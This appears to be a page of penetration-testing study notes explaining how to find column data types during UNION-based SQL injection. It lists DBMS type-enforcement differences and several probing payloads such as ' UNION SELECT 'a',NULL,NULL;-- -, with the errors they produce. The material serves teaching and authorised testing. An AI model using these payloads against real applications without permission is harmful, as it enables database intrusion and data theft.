<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>2. Identify Field Types</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>2. Identify Field Types</h1><br/><strong><h3>Identify Field Types</h3></strong><br /><br /><strong>DBMS and Type Enforcing</strong><br />Most of the DBMSs perform type enforcing on the queries. This means that with UNION statements we cannot perform a UNION between an integer and a string.<br />Depending on how the DBMS handles data types, we are required to provide an exact match of the data types for each column in the two SELECT statements:<br />    <table class="table"><tr><th>DBMS</th><th>Type Enforcing</th></tr><tr><td>MySQL</td><td>No</td></tr><tr><td>MS SQL Server</td><td>Yes</td></tr><tr><td>Oracle</td><td>Yes</td></tr><tr><td>PostgreSQl</td><td>Yes</td></tr></table><br />Therefore the following queries usually in most DBMSs except MySQL <span style="color:#ff0000;">will trigger an error</span>:<br />   ◇ <span style="color:#ff8700;">SELECT 1</span> UNION &#39;a&#39;;<br />   ◇ <span style="color:#a020f0;">SELECT ‘a’</span> UNION 1;<br /><br /><strong>Identify Field Types of the columns</strong><br />We are interested in the field of type <span style="text-decoration:underline;">string</span> because we can insert here commands like: @@version, user_name(),...<br />For a complete list of commands you can use the <a href="http://pentestmonkey.net/category/cheat-sheet/sql-injection">cheat sheets of pentestmonkey</a><br />• <span style="text-decoration:underline;">In MySQL</span>:<br />    Note: If we are on MySQL the Type Enforcing is not important as seen in the table above<br />   ◇ <span style="color:#f6ff00;">&#39; UNION SELECT &#39;a&#39;,NULL,NULL;-- -</span><br />   ◇ <span style="color:#ff00c5;">&#39; UNION SELECT 1,NULL,NULL;-- -</span><br />   ◇ <span style="color:#f6ff00;">&#39; UNION SELECT NULL,&#39;a&#39;,NULL;-- -</span><br />   ◇ <span style="color:#ff00c5;">&#39; UNION SELECT NULL,1,NULL;-- -</span><br />   ◇ <span style="color:#f6ff00;">&#39; UNION SELECT NULL,NULL,&#39;a&#39;;-- -</span><br />   ◇ <span style="color:#ff00c5;">&#39; UNION SELECT NULL,NULL,1;-- -</span><br />   ◇ <span style="color:#f6ff00;">...</span><br /><br />• <span style="text-decoration:underline;">In MS SQL Server, Oracle and PostgreSQL</span>:<br />    Depending if the SELECT statement is an <span style="color:#a020f0;">integer</span> or a <span style="color:#ff8700;">string</span>, we will use for the UNION column respectively an <span style="color:#ff00c5;">integer</span> or a <span style="color:#f6ff00;">string</span><em><br /></em>    So if we have determined that we have 3 columns from the previous chapter we have to submit:<br />   ◇ If the <span style="color:#ff8700;">SELECT statement hold string data</span>. <span style="color:#f6ff00;">Probe each column to test </span><span style="color:#f6ff00;text-decoration:underline;">which one can hold string data</span><br />      ▪ <span style="color:#f6ff00;">&#39; UNION SELECT &#39;a&#39;,NULL,NULL;-- -</span><br />      ▪ <span style="color:#f6ff00;">&#39; UNION SELECT NULL,&#39;a&#39;,NULL;-- -</span><br />      ▪ <span style="color:#f6ff00;">&#39; UNION SELECT NULL,NULL,&#39;a&#39;;-- -</span><br />      ▪ <span style="color:#f6ff00;">...</span><br />   ◇ If the <span style="color:#a020f0;">SELECT statement hold integer data</span>. <span style="color:#ff00c5;">Probe each column to test </span><span style="color:#ff00c5;text-decoration:underline;">which one can hold integer data</span><br />      ▪ <span style="color:#ff00c5;">&#39; UNION SELECT 1,NULL,NULL;-- -</span><br />      ▪ <span style="color:#ff00c5;">&#39; UNION SELECT NULL,1,NULL;-- -</span><br />      ▪ <span style="color:#ff00c5;">&#39; UNION SELECT NULL,NULL,1;-- -</span><br />      ▪ <span style="color:#ff00c5;">...</span><br /><br /><br /><strong><span style="color:#ff0000;">Not compatible</span></strong><br />If the <span style="color:#ff0000;">data type of a column is not compatible with the injected data</span>, the query will cause a database error, such this one:<br />   <code>Conversion failed when converting the varchar value &#39;a&#39; to data type int.</code><br /><br /><strong><span style="color:#1e90ff;">Compatible</span></strong><br />If <span style="color:#1e90ff;">we have a result</span> instead will look like this<br />    <a href=""><img src="images/1687-1.png" alt="images/1687-1.png" /></a><br /></div>
</body>
</html>
